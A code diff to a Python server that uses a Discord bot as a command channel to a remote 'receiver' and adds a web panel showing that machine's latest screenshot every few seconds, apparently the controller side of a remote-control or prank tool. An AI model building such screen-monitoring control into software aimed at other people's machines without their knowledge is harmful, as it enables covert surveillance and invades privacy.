@@ -45,6 +45,7 @@ assert COMMAND_CHANNEL_ID
 assert TARGET_CHANNEL_ID
 
 ROOT_DIR = Path(__file__).parent
+_latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
 
 # ---------------- DISCORD ----------------
 intents = discord.Intents.default()
@@ -62,6 +63,17 @@ async def on_ready():
     print(f"[SERVER] Logged in as {bot.user}")
     _controller_ready.set()
 
+@bot.event
+async def on_message(message: discord.Message):
+    # Track latest screenshot posted by receiver
+    if message.channel.id == TARGET_CHANNEL_ID and message.attachments:
+        for att in message.attachments:
+            name = (att.filename or "").lower()
+            if name.endswith((".png", ".jpg", ".jpeg")):
+                _latest_screenshot["url"] = att.url
+                _latest_screenshot["message_id"] = str(message.id)
+                _latest_screenshot["ts"] = str(message.created_at)
+                break
 # ---------------- WEBSOCKET HUB ----------------
 class Hub:
     def __init__(self):
@@ -103,7 +115,7 @@ CONTROL_HTML = """<!doctype html>
   <title>Controller</title>
   <style>
     body { font-family: Arial, sans-serif; background: #0f172a; color: #e2e8f0; margin: 0; padding: 20px; }
-    .card { max-width: 500px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.35); }
+    .card { max-width: 700px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.35); margin-bottom: 16px; }
     h1 { margin: 0 0 12px; font-size: 20px; }
     label { display: block; margin-bottom: 8px; color: #cbd5e1; }
     input[type=file] { width: 100%; margin-bottom: 12px; color: #e2e8f0; }
@@ -111,6 +123,7 @@ CONTROL_HTML = """<!doctype html>
     button.secondary { background: #ef4444; color: #fff; }
     .row { display: flex; gap: 10px; align-items: center; }
     small { color: #94a3b8; }
+    img { max-width: 100%; border-radius: 8px; border: 1px solid #1f2937; }
   </style>
 </head>
 <body>
@@ -126,6 +139,28 @@ CONTROL_HTML = """<!doctype html>
       </form>
     </div>
   </div>
+  <div class="card">
+    <h1>Live Screen (5s)</h1>
+    <p style="margin: 4px 0 12px; color:#cbd5e1;">Latest screenshot posted by receiver every 5 seconds.</p>
+    <div id="screen-wrap">
+      <img id="screen-img" src="" alt="Waiting for screenshot..." />
+    </div>
+  </div>
+  <script>
+    async function refreshScreen() {
+      try {
+        const res = await fetch('/api/screenshot');
+        if (!res.ok) return;
+        const data = await res.json();
+        if (data.url) {
+          const img = document.getElementById('screen-img');
+          img.src = data.url + '?t=' + Date.now();
+        }
+      } catch (e) { /* ignore */ }
+    }
+    refreshScreen();
+    setInterval(refreshScreen, 4000);
+  </script>
 </body>
 </html>"""
 
@@ -179,6 +214,10 @@ async def gif_start():
 async def gif_stop():
     await _send_cmd(f"{BOT_TAG} DISPLAY_GIF_STOP")
     return JSONResponse({"ok": True})
+
+@app.get("/api/screenshot")
+async def api_screenshot():
+    return JSONResponse(_latest_screenshot)
 
 @app.post("/ui/surprise")
 async def ui_surprise():
